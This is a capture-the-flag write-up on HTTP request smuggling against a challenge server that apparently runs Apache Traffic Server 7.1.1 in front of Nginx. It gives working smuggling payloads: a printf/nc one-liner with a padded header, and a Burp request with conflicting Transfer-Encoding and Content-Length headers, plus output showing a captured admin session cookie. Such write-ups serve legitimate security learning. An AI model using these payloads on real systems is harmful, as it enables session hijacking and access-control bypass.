# 3 of hearts

> Solved too late by : Starry-lord

```
Port 33337
```

I solved this one after the competition but still felt compelled to share the process.

This one gave me a hard time, firstly because I hadn't seen HTTP request smuggling scenarios before. 

Trying to connect to the target IP:33337 redirects to a domain name 

```
threeofhearts.ctf.net
```

And displays an empty page with only the following content:

```
<script>console.log(zp2)</script>
```

Some snooping showed me the initial request was made to an Apache traffic server 7.1.1 and the second one to an Nginx server 1.15.5. 
After a few research I realized there wasn't much resource on the subject, but here's what I found :

- PortSwigger Web academy
- https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f 
- https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/

Sadly no time for going through academy through the ctf but will definitely look into it in a nearby future. 

I used 2 ways to try and see what was going on :

## Way n°1 - CLI

```
printf 'GET_/somthingthatdoesntexist_HTTP/1.1\r\n'\
'Host:threeofhearts.ctf.net\r\n'\
'X:_"%65534s"\r\n'\
'GET_http://threeofhearts.ctf.net/_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 172.17.15.117 33337
```

So here we manage to get double request by adding 65534 empty spaces between 2 get requests. 

First one results in a 400 error and second request goes through and shows the content of the internal website. 

```
┌──(kali㉿kali)-[~/.starlord]
└─$ printf 'GET_/somethingNotThere_HTTP/1.1\r\n'\
'Host:threeofhearts.ctf.net\r\n'\
'X:_"%65534s"\r\n'\
'GET_http://threeofhearts.ctf.net/out/save.txt_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 172.17.15.117 33337
HTTP/1.1 400 Invalid HTTP Request
Date: Sun, 05 Dec 2021 23:34:29 GMT
Connection: keep-alive
Server: ATS/7.1.1
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 220

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request. 
</B></FONT>
<HR>
</BODY>
HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Sun, 05 Dec 2021 23:34:29 GMT
Content-Type: text/plain
Content-Length: 151
Last-Modified: Sun, 05 Dec 2021 23:08:15 GMT
ETag: "61ad465f-97"
X-Requested: /out/save.txt
Accept-Ranges: bytes
Age: 0
Connection: keep-alive

Params:
Headers:
        X-Access: 
        Cookie: 

Params:
        cache=0
Headers:
        X-Access: 
        Cookie: 

Params:
        var1=star
        var2=lord
Headers:
        X-Access: 
        Cookie: 

                                                                                
┌──(kali㉿kali)-[~/.starlord]
└─$ 
```

## WAY n°2 - BurpSuite

It also worked with just a 0 in between GET requests and would be easier to input to burpsuite. 

The website's content would only show itself in a browser if the request was intercepted and its “Host” header manually set to threeofhearts.ctf.net

From there I found a small page with a PHP form for var1 and var2. By pressing submit, a GET request would be sent to /save.php and populate an entry in the above queried file (/out/save.txt).

There was a /private.php we were denied access to, where the flag was clearly hidden. This is the point where I had most trouble trouble realizing what was going on. 

I knew we had to craft or find the right cookie to access the private.php but didn't understand the fundamental of the HTTP request smuggling attack.

Turns out when you manage to split the request successfully, the second one will be sent from the server, which means admin headers in /out/save.txt in this case.

This was the burp request :

```
GET / HTTP/1.1
Host: threeofhearts.ctf
Transfer-Encoding: chunked
Content-Length:53

0

GET /save.php?var1=something&var2=something HTTP/1.1
```

Then making a request to /out/save.txt showed the following :

```
Headers:
  X-Access: private
  Cookie: PHPSESSID=theAdminPhpSessionId
  
Params:
  var1=something
  var2=something
Headers:
  X-Access:
  Cookie:
```

visiting /private.php with those header gave the un-guessable page link for the flag.

![](https://i.imgur.com/VPSwASa.png)